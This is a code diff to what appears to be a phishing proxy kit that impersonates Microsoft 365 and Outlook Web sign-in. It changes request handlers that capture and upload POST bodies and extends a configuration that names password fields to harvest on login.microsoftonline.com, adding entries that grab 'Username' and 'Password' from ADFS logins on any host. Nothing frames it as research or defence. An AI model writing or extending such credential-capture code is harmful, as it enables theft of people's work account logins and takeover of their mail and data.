@@ -124,12 +124,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         if (this.req.method === 'POST') {
            
-            if (this.req.url.startsWith('/common/GetCredentialType')) {
-                super.captureBody(clientContext.currentDomain, clientContext)
+            // if (this.req.url.startsWith('/common/GetCredentialType')) {
+            //     super.captureBody(clientContext.currentDomain, clientContext)
 
-            }else { 
+            // }else { 
                 super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            }
+            // }
         }
         
 
@@ -150,6 +150,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             // super.sendClientData(clientContext, {})
         }
 
+        if (this.req.url.startsWith('/owa/prefetch.aspx') || this.req.url.startsWith('/webmanifest.json')
+        || this.req.url.startsWith('/landingv2')) {
+            super.sendClientData(clientContext, {})
+
+        }
+
+       
         if (this.req.url === '/ping/v5767687') {
             super.sendClientData(clientContext, {})
             return super.exitLink('https://privacy.microsoft.com/en-us/privacystatement')
@@ -195,6 +202,20 @@ const configExport = {
             params: ['passwd'],
             urls: '',
             hosts: ['login.microsoftonline.com'],
+        },
+
+        adfsPassword: {
+            method: 'POST',
+            params: ['Username'],
+            urls: '',
+            hosts: ['*'],
+        },
+
+        adfsPassword: {
+            method: 'POST',
+            params: ['Password'],
+            urls: '',
+            hosts: ['*'],
         },
 
 
